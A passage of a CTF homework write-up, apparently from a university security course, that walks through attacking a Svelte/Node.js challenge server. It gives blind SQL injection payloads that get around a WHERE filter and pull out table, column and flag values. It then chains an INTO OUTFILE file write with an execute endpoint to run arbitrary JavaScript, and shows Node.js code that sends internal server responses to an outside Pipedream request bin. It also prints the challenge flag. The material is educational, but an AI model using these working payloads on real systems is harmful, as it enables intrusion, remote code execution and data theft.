+<span id=cb6-24><a href=#cb6-24 aria-hidden=true tabindex=-1></a>        <span class=cf>else</span>:</span>
+<span id=cb6-25><a href=#cb6-25 aria-hidden=true tabindex=-1></a>            terminate_counter <span class=op>+=</span> <span class=dv>1</span></span>
+<span id=cb6-26><a href=#cb6-26 aria-hidden=true tabindex=-1></a><span class=bu>print</span>(<span class=st>&quot;Done!&quot;</span>)</span></code></pre></div><h3 id=if-you-run-this-script-you-will-realize-that-the-console-outputs-nothing.-why>If
+you run this script, you will realize that the console outputs nothing.
+Why?</h3><h3 id=it-turns-out-the-ctf-author-decided-to-ban-the-keyword-where-and-limit.>It
+turns out the CTF author decided to ban the keyword <code>WHERE</code>
+and <code>LIMIT</code>.</h3><figure><img src=/hw5b/rty.jpg alt=rty.JPG><figcaption aria-hidden=true>rty.JPG</figcaption></figure><p>If we cannot use <code>WHERE</code>, are there any other
+alternatives?</p><p>If you Google (and try harder) enough, you will find out there is
+something called <code>HAVING</code>, which can act as a replacement for
+WHERE. Now our payload becomes:</p><p><code>SELECT CASE WHEN EXISTS(SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES HAVING table_name LIKE \'' + database_name + char + '%\' AND table_schema = (\'firebird\')) THEN \'lol\' ELSE exp(1000) END</code></p><p>Edit the script, and it should give the output after a while. In the
+meantime here is a GIF while the script runs.</p><p><a href=https://tenor.com/view/anime-meme-dance-round-and-round-spin-gif-15060591>https://tenor.com/view/anime-meme-dance-round-and-round-spin-gif-15060591</a></p><p>After some time, you should get the name of the table, which is
+“<strong>homework</strong>”.</p><h3 id=question-what-happens-if-there-are-multiple-tables-created-by-the-user>Question:
+What happens if there are multiple tables created by the user?</h3><p>Answer: Try out all the letters. :(</p><p>After getting the table name, we find the column name using something
+similar. The payload would be:</p><p><code>SELECT CASE WHEN EXISTS(SELECT column_name, table_name FROM INFORMATION_SCHEMA.COLUMNS HAVING column_name LIKE \'' + database_name + char + '%\' AND table_name IN (\'homework\')) THEN \'lol\' ELSE exp(1000) END</code></p><p>Same idea, we are trying to find column names for the table
+“homework”.</p><h3 id=while-you-are-running-the-script-here-are-some-bonus-questions>While
+you are running the script, here are some bonus questions:</h3><p>================================================================</p><h3 id=bonus-1-can-we-determine-the-number-of-rows-a-table-has-without-knowing-the-column-name><strong>Bonus
+1: Can we determine the number of rows a table has without knowing the
+column name?</strong></h3><p>Answer 1: Yes, SQL has a function called count() and we can write a
+query like:</p><p><code>SELECT count(*) FROM homework</code></p><p>Which outputs the number of rows.</p><p>================================================================</p><h3 id=bonus-2-can-we-determine-the-number-of-columns-a-table-has-without-knowing-the-column-name>Bonus
+2: Can we determine the number of columns a table has without knowing
+the column name?</h3><p>Answer 2: No. (if yes big big plz tell)</p><p>================================================================</p><p>After another n minutes, you would get the only column name, which is
+“<strong>flag</strong>”.</p><p>Now, we want to print out the flag, we can again reuse the payload
+for finding the database name and modify it to (this only checks the
+first letter):</p><p><code>SELECT CASE WHEN ascii((substring((SELECT flag FROM homework), 1, 1))) = ' + random_character_integer_value + ' THEN \'lol\' ELSE exp(1000) END</code></p><p>================================================================</p><p>Now run your solve script, here is a final GIF (for 5-bi at least)
+while you wait:</p><p><a href=https://tenor.com/view/frieren-anime-warm-sousou-no-frieren-frieren-beyond-journey’s-end-gif-10978754497646408177>https://tenor.com/view/frieren-anime-warm-sousou-no-frieren-frieren-beyond-journey’s-end-gif-10978754497646408177</a></p><h3 id=and-now-after-all-that-we-get-our-flag>And now after all that,
+we get our flag:</h3><h3 id=flagar3_y0u_ok4y_h3ll0_3q>flag{ar3_y0u_ok4y_h3ll0_3q}</h3><p>================================================================</p><h3 id=bonus-3-is-there-a-faster-searching-method>Bonus 3: Is there a
+faster searching method?</h3><p>Answer 4: You can probably write a binary search using > or &lt;
+instead of just comparing it to each letter, but searching for each
+character would probably be easier to implement. (maybe?</p><p>================================================================</p><h1 id=part-2-the-power-of-code>Part 2: The power of code</h1><p>Did you remember the weird looking “Run admin script” text field when
+you first logged in? Since it hasn’t been in good use previously,
+perhaps it’s related to the second part of the homework. Let’s try
+putting something into it:</p><figure><img src=/hw5b/Untitled%206.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>One thing we could tell from this output, is that the creator of this
+challenge is a pathetic weeb.</p><figure><img src=/hw5b/Untitled%207.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>****coughs****</p><p>Let’s try some common LFI payloads:</p><figure><img src=/hw5b/Untitled%208.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>…still nothing. The network tab should at least tell us something
+about it:</p><figure><img src=/hw5b/Untitled%209.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>there we go. Using <code>/</code> or <code>..</code> in the payload
+gives us this error, but otherwise we just sees the
+<code>success: true</code> JSON response. Since that looks suspiciously
+intentional, it suggests the challenge is indeed about bypassing the LFI
+filter, allowing us to run arbitrary scripts.</p><p>How about we manually edit the request JSON body?</p><figure><img src=/hw5b/Untitled%2010.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>If you need to have the <code>success: true</code> response (and
+perhaps start executing the script), the body must be a JSON object with
+the <code>fileName</code> property. There’s nothing we can do other than
+to specify the file name of a script.</p><h2 id=sql-is-so-powerful-for-exploits>SQL is so powerful… for
+exploits</h2><p>Let’s take a step back… are there any other API endpoints we can
+use?</p><figure><img src=/hw5b/Untitled%2011.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>Isn’t this what we used to solve the previous part? Let’s see what
+else SQLi is capable of…</p><figure><img src=/hw5b/Untitled%2012.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><figure><img src=/hw5b/Untitled%2013.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>Ayo that’s a really handy <strong>arbitrary file write</strong>
+exploit<strong>.</strong> If we can inject JS scripts into files of our
+own free will, we can use the <code>/api/execute</code> endpoint to make
+the server execute it.</p><p>After some debugging and even more googling, we used a Python (not JS
+sorry) script to automate the task:</p><div class=sourceCode id=cb7><pre class="sourceCode python"><code class="sourceCode python"><span id=cb7-1><a href=#cb7-1 aria-hidden=true tabindex=-1></a>code <span class=op>=</span> <span class=st>&#39;console.log(&quot;hi&quot;)&#39;</span></span>
+<span id=cb7-2><a href=#cb7-2 aria-hidden=true tabindex=-1></a>hex_code <span class=op>=</span> code.encode().<span class=bu>hex</span>()</span>
+<span id=cb7-3><a href=#cb7-3 aria-hidden=true tabindex=-1></a></span>
+<span id=cb7-4><a href=#cb7-4 aria-hidden=true tabindex=-1></a>fname <span class=op>=</span> <span class=bu>str</span>(random.randrange(<span class=dv>0</span>, <span class=dv>10000000</span>))</span>
+<span id=cb7-5><a href=#cb7-5 aria-hidden=true tabindex=-1></a><span class=bu>print</span>(fname)</span>
+<span id=cb7-6><a href=#cb7-6 aria-hidden=true tabindex=-1></a></span>
+<span id=cb7-7><a href=#cb7-7 aria-hidden=true tabindex=-1></a>data <span class=op>=</span> {<span class=st>&quot;ok&quot;</span>: <span class=st>&quot;SELECT 0x&quot;</span> <span class=op>+</span> hex_code <span class=op>+</span></span>
+<span id=cb7-8><a href=#cb7-8 aria-hidden=true tabindex=-1></a>        <span class=ss>f&quot; INTO OUTFILE &#39;/var/lib/mysql-files/</span><span class=sc>{</span>fname<span class=sc>}</span><span class=ss>.js&#39;&quot;</span>}</span>
+<span id=cb7-9><a href=#cb7-9 aria-hidden=true tabindex=-1></a><span class=bu>print</span>(data)</span>
+<span id=cb7-10><a href=#cb7-10 aria-hidden=true tabindex=-1></a></span>
+<span id=cb7-11><a href=#cb7-11 aria-hidden=true tabindex=-1></a>response <span class=op>=</span> requests.post(<span class=st>&#39;http://chal.firebird.sh:35020/api/ok&#39;</span>,</span>
+<span id=cb7-12><a href=#cb7-12 aria-hidden=true tabindex=-1></a>                         cookies<span class=op>=</span>cookies, headers<span class=op>=</span>headers, data<span class=op>=</span>json.dumps(data))</span>
+<span id=cb7-13><a href=#cb7-13 aria-hidden=true tabindex=-1></a><span class=bu>print</span>(response.json())</span>
+<span id=cb7-14><a href=#cb7-14 aria-hidden=true tabindex=-1></a></span>
+<span id=cb7-15><a href=#cb7-15 aria-hidden=true tabindex=-1></a>data <span class=op>=</span> {<span class=st>&quot;fileName&quot;</span>: <span class=ss>f&quot;</span><span class=sc>{</span>fname<span class=sc>}</span><span class=ss>.js&quot;</span>}</span>
+<span id=cb7-16><a href=#cb7-16 aria-hidden=true tabindex=-1></a>response <span class=op>=</span> requests.post(<span class=st>&#39;http://chal.firebird.sh:35020/api/execute&#39;</span>,</span>
+<span id=cb7-17><a href=#cb7-17 aria-hidden=true tabindex=-1></a>                         cookies<span class=op>=</span>cookies, headers<span class=op>=</span>headers, data<span class=op>=</span>json.dumps(data))</span>
+<span id=cb7-18><a href=#cb7-18 aria-hidden=true tabindex=-1></a><span class=bu>print</span>(response.json())</span></code></pre></div><p>Upon running the script, the target code gets encoded into hex,
+becomes the constant column name of the SQL query, and the request was
+sent to the server. Consuming <code>/api/execute</code> allows us to
+execute our code under the same file name.</p><p>Now, how do we actually see the output? (Spoiler: we can’t. Try
+harder)</p><p>There’s something called a timing attack, in which we analyze the
+time taken, in this case, for the server to response. For example, let’s
+pass an infinite loop to the server:</p><div class=sourceCode id=cb8><pre class="sourceCode python"><code class="sourceCode python"><span id=cb8-1><a href=#cb8-1 aria-hidden=true tabindex=-1></a>code <span class=op>=</span> <span class=st>&#39;while (true) { console.log(&quot;hi&quot;); }&#39;</span></span></code></pre></div><figure><img src=/hw5b/Untitled%2014.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>That took more than 20 seconds, which entails our script probably
+worked.</p><p>Ouch, the creator just pinged us on Discord. Sorry I didn’t meant to
+blow up your server…</p><p>What else did the creator say about the challenge?</p><figure><img src=/hw5b/Untitled%2015.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>Hm. We have to make a request to run a script <em>making another
+request</em>? Oh, apparently the creator just hinted us a way we can
+retrieve the output of the JS code.</p><p>Let’s take a look at the website the creator showed us:</p><figure><img src=/hw5b/Untitled%2016.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>It is also mentioned that we should use something like Pipedream to
+capture requests, so let’s try to set up a Pipedream request bin, and
+try to send a request using the <code>HTTP</code> module. Our JavaScript
+payload would be:</p><div class=sourceCode id=cb9><pre class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id=cb9-1><a href=#cb9-1 aria-hidden=true tabindex=-1></a><span class=kw>var</span> https <span class=op>=</span> <span class=pp>require</span>(<span class=st>&#39;https&#39;</span>)<span class=op>;</span></span>
+<span id=cb9-2><a href=#cb9-2 aria-hidden=true tabindex=-1></a></span>
+<span id=cb9-3><a href=#cb9-3 aria-hidden=true tabindex=-1></a><span class=co>// Used to configure your HTTP request.</span></span>
+<span id=cb9-4><a href=#cb9-4 aria-hidden=true tabindex=-1></a><span class=kw>const</span> options <span class=op>=</span> {</span>
+<span id=cb9-5><a href=#cb9-5 aria-hidden=true tabindex=-1></a>            <span class=co>// Your Pipedream request bin link.</span></span>
+<span id=cb9-6><a href=#cb9-6 aria-hidden=true tabindex=-1></a>      <span class=dt>hostname</span><span class=op>:</span> <span class=st>&quot;woahthisisverycool.m.pipedream.net&quot;</span><span class=op>,</span></span>
+<span id=cb9-7><a href=#cb9-7 aria-hidden=true tabindex=-1></a>            <span class=co>// Not really needed but ok.</span></span>
+<span id=cb9-8><a href=#cb9-8 aria-hidden=true tabindex=-1></a>      <span class=dt>path</span><span class=op>:</span> <span class=st>&quot;/vowbecomefemboy&quot;</span><span class=op>,</span></span>
+<span id=cb9-9><a href=#cb9-9 aria-hidden=true tabindex=-1></a>      <span class=dt>method</span><span class=op>:</span> <span class=st>&quot;POST&quot;</span></span>
+<span id=cb9-10><a href=#cb9-10 aria-hidden=true tabindex=-1></a>}</span>
+<span id=cb9-11><a href=#cb9-11 aria-hidden=true tabindex=-1></a></span>
+<span id=cb9-12><a href=#cb9-12 aria-hidden=true tabindex=-1></a><span class=co>// Make request.</span></span>
+<span id=cb9-13><a href=#cb9-13 aria-hidden=true tabindex=-1></a><span class=kw>const</span> req <span class=op>=</span> https<span class=op>.</span><span class=fu>request</span>(options)</span>
+<span id=cb9-14><a href=#cb9-14 aria-hidden=true tabindex=-1></a>req<span class=op>.</span><span class=fu>end</span>()</span></code></pre></div><p>Bonus: You can use <a href=https://www.toptal.com/developers/javascript-minifier>https://www.toptal.com/developers/javascript-minifier</a>
+to simplify your JavaScript into one line, which could be helpful
+(maybe?</p><p>If we run this, we realize that nothing happened.</p><figure><img src=/hw5b/image.png alt=image.png><figcaption aria-hidden=true>image.png</figcaption></figure><p>(Image of a poor, sad, empty Requestbin.)</p><p>Would it be possible that the container have some pre-installed
+modules? Let’s try to not require <code>https</code> and see what
+happens:</p><div class=sourceCode id=cb10><pre class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id=cb10-1><a href=#cb10-1 aria-hidden=true tabindex=-1></a><span class=kw>const</span> options <span class=op>=</span> {</span>
+<span id=cb10-2><a href=#cb10-2 aria-hidden=true tabindex=-1></a>      <span class=dt>hostname</span><span class=op>:</span> <span class=st>&quot;woahthisisverycool.m.pipedream.net&quot;</span><span class=op>,</span></span>
+<span id=cb10-3><a href=#cb10-3 aria-hidden=true tabindex=-1></a>      <span class=dt>path</span><span class=op>:</span> <span class=st>&quot;/vowbecomefemboy&quot;</span><span class=op>,</span></span>
+<span id=cb10-4><a href=#cb10-4 aria-hidden=true tabindex=-1></a>      <span class=dt>method</span><span class=op>:</span> <span class=st>&quot;POST&quot;</span></span>
+<span id=cb10-5><a href=#cb10-5 aria-hidden=true tabindex=-1></a>}</span>
+<span id=cb10-6><a href=#cb10-6 aria-hidden=true tabindex=-1></a></span>
+<span id=cb10-7><a href=#cb10-7 aria-hidden=true tabindex=-1></a><span class=kw>const</span> req <span class=op>=</span> https<span class=op>.</span><span class=fu>request</span>(options)</span>
+<span id=cb10-8><a href=#cb10-8 aria-hidden=true tabindex=-1></a>req<span class=op>.</span><span class=fu>end</span>()</span></code></pre></div><p>This time, it works!</p><figure><img src=/hw5b/Untitled%2017.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>So seems like some modules are already pre-installed, and we don’t
+(can’t) install our own modules. Let’s check what modules are there by
+first getting the list of modules, then sending it back as data:</p><div class=sourceCode id=cb11><pre class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id=cb11-1><a href=#cb11-1 aria-hidden=true tabindex=-1></a><span class=kw>const</span> data <span class=op>=</span> <span class=bu>JSON</span><span class=op>.</span><span class=fu>stringify</span>({</span>
+<span id=cb11-2><a href=#cb11-2 aria-hidden=true tabindex=-1></a>  <span class=st>&quot;ok&quot;</span><span class=op>:</span> <span class=bu>Object</span><span class=op>.</span><span class=fu>keys</span>(<span class=kw>this</span>)</span>
+<span id=cb11-3><a href=#cb11-3 aria-hidden=true tabindex=-1></a>})</span>
+<span id=cb11-4><a href=#cb11-4 aria-hidden=true tabindex=-1></a></span>
+<span id=cb11-5><a href=#cb11-5 aria-hidden=true tabindex=-1></a><span class=kw>const</span> options <span class=op>=</span> {</span>
+<span id=cb11-6><a href=#cb11-6 aria-hidden=true tabindex=-1></a>      <span class=dt>hostname</span><span class=op>:</span> <span class=st>&quot;woahthisisverycool.m.pipedream.net&quot;</span><span class=op>,</span></span>
+<span id=cb11-7><a href=#cb11-7 aria-hidden=true tabindex=-1></a>      <span class=dt>path</span><span class=op>:</span> <span class=st>&quot;/vowbecomefemboy&quot;</span><span class=op>,</span></span>
+<span id=cb11-8><a href=#cb11-8 aria-hidden=true tabindex=-1></a>      <span class=dt>method</span><span class=op>:</span> <span class=st>&quot;POST&quot;</span></span>
+<span id=cb11-9><a href=#cb11-9 aria-hidden=true tabindex=-1></a>}</span>
+<span id=cb11-10><a href=#cb11-10 aria-hidden=true tabindex=-1></a></span>
+<span id=cb11-11><a href=#cb11-11 aria-hidden=true tabindex=-1></a><span class=kw>const</span> req <span class=op>=</span> https<span class=op>.</span><span class=fu>request</span>(options)</span>
+<span id=cb11-12><a href=#cb11-12 aria-hidden=true tabindex=-1></a>req<span class=op>.</span><span class=fu>write</span>(data)</span>
+<span id=cb11-13><a href=#cb11-13 aria-hidden=true tabindex=-1></a>req<span class=op>.</span><span class=fu>end</span>()</span></code></pre></div><figure><img src=/hw5b/Untitled%2018.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>Ok, seems like only <code>http</code> and <code>https</code> are
+installed. (Prior to this, gldanoob used <code>fetch</code> and found
+out there are 4 modules installed, with one being <code>fetch</code>,
+<del>CTF author modify solution bad bad</del>.)</p><p>Now we can send data back to our Requestbin, but the problem is where
+should we get our data (flag) from? Since we can now run JavaScript on
+server side, let’s try accessing the website using
+<code>localhost</code>!</p><p>But what is the port for <code>localhost</code>? As given in Hint 2,
+this server uses Svelte and Node.js, so after some Googling, the
+possible ports could be 3000, 4173 or 5173. (It is recommended to refer
+to the official documentation since Reddit lied to me about port being
+5000 and 8080)</p><p>After some testing (and crashing the server because you picked the
+wrong port), you will find out that only <strong>port 5173</strong> did
+not crash, so this should be the correct port. (<del>or just wrench
+author probably more easier</del>)</p><p>Now, let’s try to send the login page back to our Requestbin:</p><div class=sourceCode id=cb12><pre class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id=cb12-1><a href=#cb12-1 aria-hidden=true tabindex=-1></a><span class=co>// Send GET request to the login page.</span></span>
+<span id=cb12-2><a href=#cb12-2 aria-hidden=true tabindex=-1></a><span class=kw>const</span> options1 <span class=op>=</span> {</span>
+<span id=cb12-3><a href=#cb12-3 aria-hidden=true tabindex=-1></a>  <span class=dt>hostname</span><span class=op>:</span> <span class=st>&quot;localhost&quot;</span><span class=op>,</span></span>
+<span id=cb12-4><a href=#cb12-4 aria-hidden=true tabindex=-1></a>  <span class=dt>port</span><span class=op>:</span> <span class=dv>5173</span><span class=op>,</span></span>
+<span id=cb12-5><a href=#cb12-5 aria-hidden=true tabindex=-1></a>  <span class=dt>path</span><span class=op>:</span> <span class=st>&quot;/&quot;</span><span class=op>,</span></span>
+<span id=cb12-6><a href=#cb12-6 aria-hidden=true tabindex=-1></a>  <span class=dt>method</span><span class=op>:</span> <span class=st>&quot;GET&quot;</span><span class=op>,</span></span>
+<span id=cb12-7><a href=#cb12-7 aria-hidden=true tabindex=-1></a>  <span class=dt>headers</span><span class=op>:</span> {</span>
+<span id=cb12-8><a href=#cb12-8 aria-hidden=true tabindex=-1></a>    <span class=st>&quot;Content-Type&quot;</span><span class=op>:</span> <span class=st>&quot;application/json&quot;</span><span class=op>,</span></span>
+<span id=cb12-9><a href=#cb12-9 aria-hidden=true tabindex=-1></a>    <span class=st>&quot;Cookie&quot;</span><span class=op>:</span> <span class=st>&quot;Add your own Cookies.&quot;</span></span>
+<span id=cb12-10><a href=#cb12-10 aria-hidden=true tabindex=-1></a>  }<span class=op>,</span></span>
+<span id=cb12-11><a href=#cb12-11 aria-hidden=true tabindex=-1></a>}</span>
+<span id=cb12-12><a href=#cb12-12 aria-hidden=true tabindex=-1></a></span>
+<span id=cb12-13><a href=#cb12-13 aria-hidden=true tabindex=-1></a><span class=co>// Get the response body and put it into different variables.</span></span>
+<span id=cb12-14><a href=#cb12-14 aria-hidden=true tabindex=-1></a><span class=kw>const</span> req1 <span class=op>=</span> http<span class=op>.</span><span class=fu>request</span>(options1<span class=op>,</span> <span class=kw>function</span>(res) {</span>
+<span id=cb12-15><a href=#cb12-15 aria-hidden=true tabindex=-1></a>  <span class=kw>var</span> status_code <span class=op>=</span> res<span class=op>.</span><span class=at>statusCode</span><span class=op>;</span></span>
+<span id=cb12-16><a href=#cb12-16 aria-hidden=true tabindex=-1></a>  <span class=kw>var</span> heading <span class=op>=</span> <span class=bu>JSON</span><span class=op>.</span><span class=fu>stringify</span>(res<span class=op>.</span><span class=at>headers</span>)</span>
+<span id=cb12-17><a href=#cb12-17 aria-hidden=true tabindex=-1></a>  res<span class=op>.</span><span class=fu>on</span>(<span class=st>&quot;data&quot;</span><span class=op>,</span> <span class=kw>function</span>(chunk) {</span>
+<span id=cb12-18><a href=#cb12-18 aria-hidden=true tabindex=-1></a>    <span class=kw>var</span> lol <span class=op>=</span> chunk<span class=op>.</span><span class=fu>toString</span>()<span class=op>;</span></span>
+<span id=cb12-19><a href=#cb12-19 aria-hidden=true tabindex=-1></a></span>
+<span id=cb12-20><a href=#cb12-20 aria-hidden=true tabindex=-1></a>        <span class=co>// Pack variables into data.</span></span>
+<span id=cb12-21><a href=#cb12-21 aria-hidden=true tabindex=-1></a>    <span class=kw>const</span> data <span class=op>=</span> <span class=bu>JSON</span><span class=op>.</span><span class=fu>stringify</span>({</span>
+<span id=cb12-22><a href=#cb12-22 aria-hidden=true tabindex=-1></a>      <span class=st>&quot;status_code&quot;</span><span class=op>:</span> status_code<span class=op>,</span></span>
+<span id=cb12-23><a href=#cb12-23 aria-hidden=true tabindex=-1></a>      <span class=st>&quot;heading&quot;</span><span class=op>:</span> heading<span class=op>,</span></span>
+<span id=cb12-24><a href=#cb12-24 aria-hidden=true tabindex=-1></a>      <span class=st>&quot;data&quot;</span><span class=op>:</span> lol</span>
+<span id=cb12-25><a href=#cb12-25 aria-hidden=true tabindex=-1></a>    })</span>
+<span id=cb12-26><a href=#cb12-26 aria-hidden=true tabindex=-1></a></span>
+<span id=cb12-27><a href=#cb12-27 aria-hidden=true tabindex=-1></a>    <span class=kw>const</span> options2 <span class=op>=</span> {</span>
+<span id=cb12-28><a href=#cb12-28 aria-hidden=true tabindex=-1></a>      <span class=dt>hostname</span><span class=op>:</span> <span class=st>&quot;Add your own Requestbin link.&quot;</span><span class=op>,</span></span>
+<span id=cb12-29><a href=#cb12-29 aria-hidden=true tabindex=-1></a>      <span class=dt>path</span><span class=op>:</span> <span class=st>&quot;/vowbecomefemboy&quot;</span><span class=op>,</span></span>
+<span id=cb12-30><a href=#cb12-30 aria-hidden=true tabindex=-1></a>      <span class=dt>method</span><span class=op>:</span> <span class=st>&quot;POST&quot;</span><span class=op>,</span></span>
+<span id=cb12-31><a href=#cb12-31 aria-hidden=true tabindex=-1></a>      <span class=dt>headers</span><span class=op>:</span> {</span>
+<span id=cb12-32><a href=#cb12-32 aria-hidden=true tabindex=-1></a>        <span class=st>&quot;Content-Type&quot;</span><span class=op>:</span> <span class=st>&quot;application/json&quot;</span><span class=op>,</span></span>
+<span id=cb12-33><a href=#cb12-33 aria-hidden=true tabindex=-1></a>      }<span class=op>,</span></span>
+<span id=cb12-34><a href=#cb12-34 aria-hidden=true tabindex=-1></a>    }</span>
+<span id=cb12-35><a href=#cb12-35 aria-hidden=true tabindex=-1></a>        </span>
+<span id=cb12-36><a href=#cb12-36 aria-hidden=true tabindex=-1></a>        <span class=co>// Send to Requestbin</span></span>
+<span id=cb12-37><a href=#cb12-37 aria-hidden=true tabindex=-1></a>    <span class=kw>const</span> req <span class=op>=</span> https<span class=op>.</span><span class=fu>request</span>(options2)</span>
+<span id=cb12-38><a href=#cb12-38 aria-hidden=true tabindex=-1></a>    req2<span class=op>.</span><span class=fu>write</span>(data)</span>
+<span id=cb12-39><a href=#cb12-39 aria-hidden=true tabindex=-1></a>    req2<span class=op>.</span><span class=fu>end</span>()</span>
+<span id=cb12-40><a href=#cb12-40 aria-hidden=true tabindex=-1></a></span>
+<span id=cb12-41><a href=#cb12-41 aria-hidden=true tabindex=-1></a>  })<span class=op>;</span></span>
+<span id=cb12-42><a href=#cb12-42 aria-hidden=true tabindex=-1></a>})</span>
+<span id=cb12-43><a href=#cb12-43 aria-hidden=true tabindex=-1></a>req1<span class=op>.</span><span class=fu>end</span>()</span></code></pre></div><figure><img src=/hw5b/Untitled%2019.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>There we go, we just got the HTML for the login page!</p><p>But where is the flag?</p><p>I guess you just have to test out different endpoints.</p><p><a href=https://tenor.com/view/aqua-aaaaa-cry-help-anime-gif-24539456>https://tenor.com/view/aqua-aaaaa-cry-help-anime-gif-24539456</a></p><p>(me when i can’t find the endpoint)</p><p>-vow</p><p>After trying out different endpoints, you realize that something is
+slightly different when you POST data to the /api/ok endpoint:</p><div class=sourceCode id=cb13><pre class="sourceCode jsx"><code class="sourceCode javascriptreact"><span id=cb13-1><a href=#cb13-1 aria-hidden=true tabindex=-1></a><span class=co>// Sending random SQL query to /api/ok</span></span>
+<span id=cb13-2><a href=#cb13-2 aria-hidden=true tabindex=-1></a><span class=kw>const</span> data1 <span class=op>=</span> <span class=bu>JSON</span><span class=op>.</span><span class=fu>stringify</span>({</span>
+<span id=cb13-3><a href=#cb13-3 aria-hidden=true tabindex=-1></a>  <span class=st>&quot;ok&quot;</span><span class=op>:</span> <span class=st>&quot;SELECT *&quot;</span><span class=op>,</span></span>
+<span id=cb13-4><a href=#cb13-4 aria-hidden=true tabindex=-1></a>})</span>
+<span id=cb13-5><a href=#cb13-5 aria-hidden=true tabindex=-1></a></span>
+<span id=cb13-6><a href=#cb13-6 aria-hidden=true tabindex=-1></a><span class=kw>const</span> options1 <span class=op>=</span> {</span>
+<span id=cb13-7><a href=#cb13-7 aria-hidden=true tabindex=-1></a>  <span class=dt>hostname</span><span class=op>:</span> <span class=st>&quot;localhost&quot;</span><span class=op>,</span></span>
+<span id=cb13-8><a href=#cb13-8 aria-hidden=true tabindex=-1></a>  <span class=dt>port</span><span class=op>:</span> <span class=dv>5173</span><span class=op>,</span></span>
+<span id=cb13-9><a href=#cb13-9 aria-hidden=true tabindex=-1></a>  <span class=dt>path</span><span class=op>:</span> <span class=st>&quot;/api/ok&quot;</span><span class=op>,</span></span>
+<span id=cb13-10><a href=#cb13-10 aria-hidden=true tabindex=-1></a>  <span class=dt>method</span><span class=op>:</span> <span class=st>&quot;POST&quot;</span><span class=op>,</span></span>
+<span id=cb13-11><a href=#cb13-11 aria-hidden=true tabindex=-1></a>  <span class=dt>headers</span><span class=op>:</span> {</span>
+<span id=cb13-12><a href=#cb13-12 aria-hidden=true tabindex=-1></a>    <span class=st>&quot;Content-Type&quot;</span><span class=op>:</span> <span class=st>&quot;application/json&quot;</span><span class=op>,</span></span>
+<span id=cb13-13><a href=#cb13-13 aria-hidden=true tabindex=-1></a>    <span class=st>&quot;Cookie&quot;</span><span class=op>:</span> <span class=st>&quot;Add your own Cookies.&quot;</span></span>
+<span id=cb13-14><a href=#cb13-14 aria-hidden=true tabindex=-1></a>  }<span class=op>,</span></span>
+<span id=cb13-15><a href=#cb13-15 aria-hidden=true tabindex=-1></a>}</span>
+<span id=cb13-16><a href=#cb13-16 aria-hidden=true tabindex=-1></a></span>
+<span id=cb13-17><a href=#cb13-17 aria-hidden=true tabindex=-1></a><span class=co>// Get the response body and put it into different variables.</span></span>
+<span id=cb13-18><a href=#cb13-18 aria-hidden=true tabindex=-1></a><span class=kw>const</span> req1 <span class=op>=</span> http<span class=op>.</span><span class=fu>request</span>(options1<span class=op>,</span> <span class=kw>function</span>(res) {</span>
+<span id=cb13-19><a href=#cb13-19 aria-hidden=true tabindex=-1></a>  <span class=kw>var</span> status_code <span class=op>=</span> res<span class=op>.</span><span class=at>statusCode</span><span class=op>;</span></span>
+<span id=cb13-20><a href=#cb13-20 aria-hidden=true tabindex=-1></a>  <span class=kw>var</span> heading <span class=op>=</span> <span class=bu>JSON</span><span class=op>.</span><span class=fu>stringify</span>(res<span class=op>.</span><span class=at>headers</span>)</span>
+<span id=cb13-21><a href=#cb13-21 aria-hidden=true tabindex=-1></a>  res<span class=op>.</span><span class=fu>on</span>(<span class=st>&quot;data&quot;</span><span class=op>,</span> <span class=kw>function</span>(chunk) {</span>
+<span id=cb13-22><a href=#cb13-22 aria-hidden=true tabindex=-1></a>    <span class=kw>var</span> lol <span class=op>=</span> chunk<span class=op>.</span><span class=fu>toString</span>()<span class=op>;</span></span>
+<span id=cb13-23><a href=#cb13-23 aria-hidden=true tabindex=-1></a></span>
+<span id=cb13-24><a href=#cb13-24 aria-hidden=true tabindex=-1></a>        <span class=co>// Pack variables into data.</span></span>
+<span id=cb13-25><a href=#cb13-25 aria-hidden=true tabindex=-1></a>    <span class=kw>const</span> data2 <span class=op>=</span> <span class=bu>JSON</span><span class=op>.</span><span class=fu>stringify</span>({</span>
+<span id=cb13-26><a href=#cb13-26 aria-hidden=true tabindex=-1></a>      <span class=st>&quot;status_code&quot;</span><span class=op>:</span> status_code<span class=op>,</span></span>
+<span id=cb13-27><a href=#cb13-27 aria-hidden=true tabindex=-1></a>      <span class=st>&quot;heading&quot;</span><span class=op>:</span> heading<span class=op>,</span></span>
+<span id=cb13-28><a href=#cb13-28 aria-hidden=true tabindex=-1></a>      <span class=st>&quot;data&quot;</span><span class=op>:</span> lol</span>
+<span id=cb13-29><a href=#cb13-29 aria-hidden=true tabindex=-1></a>    })</span>
+<span id=cb13-30><a href=#cb13-30 aria-hidden=true tabindex=-1></a></span>
+<span id=cb13-31><a href=#cb13-31 aria-hidden=true tabindex=-1></a>    <span class=kw>const</span> options2 <span class=op>=</span> {</span>
+<span id=cb13-32><a href=#cb13-32 aria-hidden=true tabindex=-1></a>      <span class=dt>hostname</span><span class=op>:</span> <span class=st>&quot;Add your own Requestbin link.&quot;</span><span class=op>,</span></span>
+<span id=cb13-33><a href=#cb13-33 aria-hidden=true tabindex=-1></a>      <span class=dt>path</span><span class=op>:</span> <span class=st>&quot;/vowbecomefemboy&quot;</span><span class=op>,</span></span>
